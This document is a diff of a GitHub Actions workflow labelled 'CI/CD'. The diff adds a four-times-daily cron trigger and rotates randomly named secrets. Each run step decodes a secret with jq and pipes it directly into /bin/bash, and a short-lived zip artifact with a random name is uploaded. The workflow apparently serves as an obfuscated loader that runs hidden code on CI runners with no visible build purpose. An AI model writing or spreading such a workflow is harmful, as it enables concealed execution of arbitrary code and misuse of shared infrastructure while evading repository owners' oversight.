@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '27 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -14,17 +16,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          uhjax03: ${{ secrets.uhjax03 }}
+          ugeyz21: ${{ secrets.ugeyz21 }}
         run: |
-          printf '%s' "$uhjax03" | jq -r .kpfp0 | /bin/bash
-          echo $fttc8984 | jq -r .hzkm156 | /bin/bash
-          printf '%s' "$idf81553" | jq -r .xn14 | /bin/bash
-          echo $vcs63 | jq -r .y70 | /bin/bash
-          echo $nixbi6 | jq -r .cc778 | /bin/bash
+          printf '%s' "$ugeyz21" | jq -r .gqaog54985 | /bin/bash
+          printf '%s' "$myb902" | jq -r .cnbh1 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: yrh8SNNc
+          name: ggp1reFn
           path: "*.zip"
           retention-days: 1
